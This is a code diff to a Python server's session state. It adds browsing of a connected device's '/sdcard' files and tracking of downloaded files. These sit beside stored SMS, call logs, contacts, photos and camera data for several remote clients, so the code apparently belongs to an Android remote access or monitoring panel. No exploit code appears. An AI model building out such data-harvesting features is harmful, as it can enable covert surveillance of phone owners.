@@ -25,6 +25,9 @@ class ClientSession:
         self.latest_call_logs: List[Dict[str, Any]] = []
         self.contacts_list: List[Dict[str, Any]] = []
         self.telemetry: Optional[Dict[str, Any]] = None
+        self.files_tree: List[Dict[str, Any]] = []
+        self.files_current_path: str = "/sdcard"
+        self.latest_downloaded_file: Optional[Dict[str, Any]] = None
         self.disconnect_event: asyncio.Event = asyncio.Event()
 
     def is_connected(self) -> bool:
@@ -74,6 +77,9 @@ class AppState:
         self.persisted_photo: Optional[str] = None
         self.persisted_photo_bytes: Optional[bytes] = None
         self.persisted_cameras: List[Dict[str, Any]] = []
+        self.persisted_files: List[Dict[str, Any]] = []
+        self.persisted_files_path: str = "/sdcard"
+        self.persisted_downloaded_file: Optional[Dict[str, Any]] = None
 
         self.default_disconnect_event: asyncio.Event = asyncio.Event()
         self.load_persisted_state()
@@ -271,6 +277,48 @@ class AppState:
         self.persisted_cameras = val
 
     @property
+    def files_tree(self) -> List[Dict[str, Any]]:
+        ac = self.get_active_client()
+        if ac and ac.files_tree:
+            return ac.files_tree
+        return self.persisted_files
+
+    @files_tree.setter
+    def files_tree(self, val: List[Dict[str, Any]]) -> None:
+        ac = self.get_active_client()
+        if ac:
+            ac.files_tree = val
+        self.persisted_files = val
+
+    @property
+    def files_current_path(self) -> str:
+        ac = self.get_active_client()
+        if ac and ac.files_current_path:
+            return ac.files_current_path
+        return self.persisted_files_path
+
+    @files_current_path.setter
+    def files_current_path(self, val: str) -> None:
+        ac = self.get_active_client()
+        if ac:
+            ac.files_current_path = val
+        self.persisted_files_path = val
+
+    @property
+    def latest_downloaded_file(self) -> Optional[Dict[str, Any]]:
+        ac = self.get_active_client()
+        if ac and ac.latest_downloaded_file:
+            return ac.latest_downloaded_file
+        return self.persisted_downloaded_file
+
+    @latest_downloaded_file.setter
+    def latest_downloaded_file(self, val: Optional[Dict[str, Any]]) -> None:
+        ac = self.get_active_client()
+        if ac:
+            ac.latest_downloaded_file = val
+        self.persisted_downloaded_file = val
+
+    @property
     def disconnect_event(self) -> asyncio.Event:
         ac = self.get_active_client()
         return ac.disconnect_event if ac else self.default_disconnect_event
@@ -320,6 +368,18 @@ class AppState:
         except Exception:
             pass
 
+        try:
+            files_path = settings.storage_dir / "latest_files.json"
+            if files_path.exists():
+                data = json.loads(files_path.read_text(encoding="utf-8"))
+                if isinstance(data, dict):
+                    self.persisted_files = data.get("files", [])
+                    self.persisted_files_path = data.get("path", "/sdcard")
+                elif isinstance(data, list):
+                    self.persisted_files = data
+        except Exception:
+            pass
+
     def clear_all_data(self) -> None:
         for client in self.clients.values():
             client.latest_sms = []
@@ -331,6 +391,8 @@ class AppState:
             client.latest_photo_bytes = None
             client.telemetry = None
             client.cameras = []
+            client.files_tree = []
+            client.latest_downloaded_file = None
 
         self.persisted_sms = []
         self.persisted_call_logs = []
@@ -341,9 +403,11 @@ class AppState:
         self.persisted_photo = None
         self.persisted_photo_bytes = None
         self.persisted_cameras = []
+        self.persisted_files = []
+        self.persisted_downloaded_file = None
         try:
             if settings.storage_dir.exists():
-                for filename in ["contacts.zip", "latest_sms.json", "latest_call_logs.json", "latest_telemetry.json"]:
+                for filename in ["contacts.zip", "latest_sms.json", "latest_call_logs.json", "latest_telemetry.json", "latest_files.json"]:
                     target = settings.storage_dir / filename
                     if target.exists():
                         target.unlink(missing_ok=True)
